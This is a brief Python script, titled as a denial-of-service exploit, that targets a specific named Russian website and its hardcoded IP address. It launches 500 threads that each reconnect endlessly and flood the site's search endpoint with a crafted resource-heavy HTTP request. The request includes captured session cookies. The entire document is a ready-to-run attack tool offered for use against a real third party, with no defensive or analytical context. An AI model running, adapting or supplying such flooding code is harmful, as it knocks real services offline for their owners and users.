'''
Exploit for DOS iac46.ru
'''

import socket
import time
import threading
import requests
payload = b'GET /index.php?searchword=1&ordering=newest&searchphrase=exact&areas[0]=content&areas[1]=weblinks&areas[2]=categories&areas[3]=sections&areas[4]=newsfeeds&option=com_search HTTP/1.1\r\nHost: iac46.ru\r\nUser-Agent: Say10\r\nAccept: text/html,application/xhtml+xml\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://iac46.ru/index.php?searchword=1&ordering=newest&searchphrase=exact&areas[0]=content&areas[1]=weblinks&areas[2]=categories&areas[3]=sections&areas[4]=newsfeeds&option=com_search\r\nConnection: keep-alive\r\nCookie: 8ab6136db8aab79bdf465e8e79151355=77jr3ljevk1god9sktkkp3kve1; sputnik_session=1560875606311|17\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'
print('Heil to the Saitan')
def dos():
    global payload
    while True:
        try_ = True
        while try_:
            sock = socket.socket()
            sock.settimeout(0.4)
            try:
                sock.connect(('31.131.251.38',80))
                try_ = False
            except:
                sock.close()
                try_ = True
        while True:
            try:
                sock.send(payload)
            except:
                sock.close()
                break



t = []
n = 500

for i in range(n):
        t.append(threading.Thread(target = dos))

for i in range(n):
        t[i].start()

for i in range(n):
        t[i].join()
